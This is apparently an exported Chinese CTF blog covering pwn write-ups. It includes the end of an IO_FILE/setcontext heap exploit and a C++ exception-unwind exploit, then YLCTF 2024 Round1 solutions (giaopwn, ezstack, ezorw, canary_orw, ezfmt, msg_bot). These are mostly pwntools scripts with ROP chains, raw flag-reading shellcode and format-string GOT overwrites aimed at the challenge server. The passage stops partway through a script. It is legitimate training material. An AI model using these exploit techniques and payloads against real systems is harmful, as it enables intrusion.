mov rsp,QWORD PTR [rdx+0xa0]</span><br>    <span class="hljs-number">0x80</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov rbx,QWORD PTR [rdx+0x80]</span><br>    <span class="hljs-number">0x78</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov rbp,QWORD PTR [rdx+0x78]</span><br>    <span class="hljs-number">0x48</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov r12,QWORD PTR [rdx+0x48]</span><br>    <span class="hljs-number">0x50</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov r13,QWORD PTR [rdx+0x50]</span><br>    <span class="hljs-number">0x58</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov r14,QWORD PTR [rdx+0x58]</span><br>    <span class="hljs-number">0x60</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov r15,QWORD PTR [rdx+0x60]</span><br>    <span class="hljs-number">0xa8</span>: p64(ret), <span class="hljs-comment"># mov rcx,QWORD PTR [rdx+0xa8] ; push rcx</span><br>    <span class="hljs-number">0x70</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov rsi,QWORD PTR [rdx+0x70]</span><br>    <span class="hljs-number">0x68</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov rdi,QWORD PTR [rdx+0x68]</span><br>    <span class="hljs-number">0x98</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov rcx,QWORD PTR [rdx+0x98]</span><br>    <span class="hljs-number">0x28</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov r8,QWORD PTR [rdx+0x28]</span><br>    <span class="hljs-number">0x30</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov r9,QWORD PTR [rdx+0x30]</span><br>    <span class="hljs-number">0x88</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov rdx,QWORD PTR [rdx+0x88]</span><br>    &#125;,filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>iofile += setcontext<br>iofile = iofile.ljust(<span class="hljs-number">0x360</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>iofile += p64(pop_rdi) + p64(heap_base)<br>iofile += p64(pop_rsi) + p64(<span class="hljs-number">0x10000</span>)<br>iofile += p64(pop_rdx_r12) + p64(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>)<br>iofile += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>])<br>iofile += p64(fake_IO_file+<span class="hljs-number">0x400</span>)<br><br>iofile = iofile.ljust(<span class="hljs-number">0x400</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>shellcode = <span class="hljs-string">b&#x27;H\xc7\xc0flagPH1\xffH\x83\xefdH\x89\xe6j\x00j\x00j\x00H\x89\xe2I\xc7\xc2\x18\x00\x00\x00h\xb5\x01\x00\x00X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05&#x27;</span><br>iofile += shellcode<br><br>payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(IO_list_all-<span class="hljs-number">0x20</span>)<br>payload += iofile[<span class="hljs-number">0x30</span>:]<br><br>edit(<span class="hljs-number">1</span>,payload)<br>add(<span class="hljs-number">0x500</span>)<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><br>p.sendlineafter(<span class="hljs-string">b&quot;choice: \n&quot;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="expect-number"><a href="#expect-number" class="headerlink" title="expect_number"></a>expect_number</h1><p>存储历史输入和当前结果的数组存在溢出，可以覆盖一个指针<br>这个指针原本指向的是一个函数指针，用于退出程序<br>不过可以覆盖指针的后几位，使其指向另一个函数，这个函数中存在栈溢出和c++异常处理<br>可用利用c++异常处理机制跳转到system(“&#x2F;bin&#x2F;sh”)的位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>clibc = ctypes.CDLL(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>clibc.srand(<span class="hljs-number">1</span>)<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>program = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cont</span>(<span class="hljs-params">choose</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice \n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;0\n&#x27;</span>,<span class="hljs-built_in">str</span>(choose).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice \n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice \n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice \n&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><br>choose = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>]<br><br>ref = &#123;<br><span class="hljs-number">1</span>:<span class="hljs-number">0</span>,<br><span class="hljs-number">2</span>:<span class="hljs-number">0</span>,<br><span class="hljs-number">3</span>:<span class="hljs-number">1</span>,<br><span class="hljs-number">4</span>:<span class="hljs-number">1</span>,<br>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">276</span>):<br>    op = clibc.rand() % <span class="hljs-number">4</span> + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> i &lt; <span class="hljs-built_in">len</span>(choose):<br>        cont(choose[i])<br>    <span class="hljs-keyword">else</span>:<br>        cont(ref[op])<br><br>show()<br>link = u64(p.recvline()[-<span class="hljs-number">7</span>:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>program.address = link - <span class="hljs-number">0x4c60</span><br><br>Exit()<br>p.recvuntil(<span class="hljs-string">b&#x27;number.\n&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>bss = program.address + <span class="hljs-number">0x5500</span><br>unwind_target = program.address + <span class="hljs-number">0x2516</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(bss) + p64(unwind_target)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024源鲁杯</title>
      <link href="/2024/11/05/YLCTF2024/"/>
      <url>/2024/11/05/YLCTF2024/</url>
      
        <content type="html"><![CDATA[<p>源鲁杯</p><span id="more"></span><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Round1"><a href="#Round1" class="headerlink" title="Round1"></a>Round1</h2><h3 id="giaopwn"><a href="#giaopwn" class="headerlink" title="giaopwn"></a>giaopwn</h3><p>简单的栈题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>,<span class="hljs-number">39988</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;pwn&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><br>call_system = <span class="hljs-number">0x4006D2</span><br>acatflag = <span class="hljs-number">0x601048</span><br>pop_rdi = <span class="hljs-number">0x0000000000400743</span> <span class="hljs-comment"># pop rdi ; ret</span><br>ret = <span class="hljs-number">0x4006C6</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(pop_rdi) + p64(acatflag) + p64(call_system)<br>p.recvuntil(<span class="hljs-string">b&#x27;YLCTF\n&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ezstack"><a href="#ezstack" class="headerlink" title="ezstack"></a>ezstack</h3><p>一个命令执行的字符过滤绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;challenge.yuanloo.com&#x27;</span>,<span class="hljs-number">43724</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;pwn&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;stack\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">48</span>+<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x401352</span>) + p64(<span class="hljs-number">0x401275</span>)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;command\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;$0&#x27;</span><br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ezorw"><a href="#ezorw" class="headerlink" title="ezorw"></a>ezorw</h3><p>写一个openat加sendfile的shellcode就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>,<span class="hljs-number">29188</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;pwn&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><br>payload = <span class="hljs-string">b&#x27;H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H1\xffH\xff\xc7H\x89\xc6H1\xd2I\xc7\xc2\x00\x01\x00\x00H\xc7\xc0(\x00\x00\x00\x0f\x05&#x27;</span><br>p.recvuntil(<span class="hljs-string">b&#x27;orw~\n&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="canary-orw"><a href="#canary-orw" class="headerlink" title="canary_orw"></a>canary_orw</h3><p>劫持一下stack_chk_fail函数<br>再利用jmp rsp的gadget执行shellcode就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><br><span class="hljs-comment"># p = process(&quot;./canary&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>,<span class="hljs-number">39532</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;canary&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><br>vuln = <span class="hljs-number">0x400820</span><br>stack_chk_fail_got = elf.got[<span class="hljs-string">&#x27;__stack_chk_fail&#x27;</span>] <br>jmp_rsp = <span class="hljs-number">0x40081B</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;journey\n&#x27;</span>)<br>p.send(p64(vuln))<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Sea\n&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(stack_chk_fail_got))<br><br>p.recvuntil(<span class="hljs-string">b&#x27;magic\n&#x27;</span>)<br>p.send(p64(<span class="hljs-number">0x4008F0</span>))<br><br>shellcode = <span class="hljs-string">b&#x27;H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H1\xffH\xff\xc7H\x89\xc6H1\xd2I\xc7\xc2\x00\x01\x00\x00H\xc7\xc0(\x00\x00\x00\x0f\x05&#x27;</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(jmp_rsp) + shellcode<br>p.recvuntil(<span class="hljs-string">b&#x27;go!\n&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ezfmt"><a href="#ezfmt" class="headerlink" title="ezfmt"></a>ezfmt</h3><p>先用格式化字符串泄露libc基址，返回到_start函数再利用一次格式化字符串修改printf为system<br>最后输入&#x2F;bin&#x2F;sh获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>,<span class="hljs-number">28489</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><span class="hljs-comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><br>_start = <span class="hljs-number">0x4010B0</span><br>main = <span class="hljs-number">0x4011DD</span><br>vuln = <span class="hljs-number">0x401208</span><br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">b&#x27;YLCTF\n&#x27;</span>)<br>payload = <span class="hljs-string">b&quot;%10$s&quot;</span><br>payload = payload.ljust(<span class="hljs-number">32</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(printf_got) + p64(_start)<br>p.send(payload)<br><br>printf_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = printf_addr - libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>log.success(<span class="hljs-string">&quot;printf_addr -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(printf_addr))<br>log.success(<span class="hljs-string">&quot;system_addr -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(system_addr))<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;YLCTF\n&#x27;</span>)<br>payload = <span class="hljs-string">b&quot;%10$&quot;</span> + <span class="hljs-built_in">str</span>((system_addr&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xffff</span>).encode() + <span class="hljs-string">b&#x27;c%10$hn&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">32</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(printf_got+<span class="hljs-number">1</span>) + p64(_start)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;YLCTF\n&#x27;</span>)<br>p.send(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="msg-bot"><a href="#msg-bot" class="headerlink" title="msg_bot"></a>msg_bot</h3><p>从程序中还原protobuf结构体</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">syntax</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;proto3&quot;</span><span class="hljs-comment">; //proto version 2 or 3</span><br><br>message Msgbot&#123;<br>    int64 msgid <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>    int64 msgsize <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>    bytes msgcontent <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>写一个c语言的打包函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;bot.msgbot.pb-c.h&quot;</span></span><br><br><span class="hljs-type">char</span> *<span class="hljs-title function_">gen</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    Msgbot msg = MSGBOT__INIT;<br>    msg.msgid = <span class="hljs-number">0xC0DEFEED</span>;<br>    msg.msgsize = <span class="hljs-number">0xF00DFACE</span>;<br>    ProtobufCBinaryData content = &#123;<br>        (<span class="hljs-type">size_t</span>)<span class="hljs-built_in">strlen</span>(data),<br>        data<br>    &#125;;<br>    msg.msgcontent = content;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len = msgbot__get_packed_size(&amp;msg);<br>    <span class="hljs-type">char</span> *buf = <span class="hljs-built_in">malloc</span>(len);<br>    msgbot__pack(&amp;msg, buf);<br>    <span class="hljs-keyword">return</span> buf;<br>&#125;<br></code></pre></td></tr></table></figure><p>写一个纯可打印字符的shellcode读取另一部分shellcode<br>再使用retfq转为32位执行open<br>最后转回64位使用read和write获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><span class="hljs-comment"># context.arch = &quot;amd64&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br>elf = ELF(<span class="hljs-string">&quot;msg_bot&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><br>clibc = ctypes.CDLL(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>addr = <span class="hljs-number">0</span><br>dest = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># p = process(&quot;./msg_bot&quot;)</span><br>    p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>,<span class="hljs-number">37809</span>)<br>    clibc.srand(clibc.time(<span class="hljs-number">0</span>))<br>    dest = clibc.rand() % <span class="hljs-number">0x7FFFFFFF</span><br>    dest = dest &amp; <span class="hljs-number">0xFFFFF000</span><br>    addr = dest + <span class="hljs-number">0x550</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (isprint(p32(addr)[<span 